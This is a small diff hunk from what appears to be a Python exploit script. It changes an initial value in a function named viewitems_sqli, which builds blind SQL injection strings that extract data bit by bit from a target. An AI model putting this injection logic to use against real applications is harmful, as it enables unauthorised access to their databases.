@@ -36,7 +36,7 @@ def request_token(target, username):
 
 def viewitems_sqli(target, inj_string):
     bits ="0"
-    return_value = 1
+    return_value = 0
 
     for j in reversed(range(8)):
         inj_strings = "%s>>%s)+=%s" %(inj_string,j, return_value)
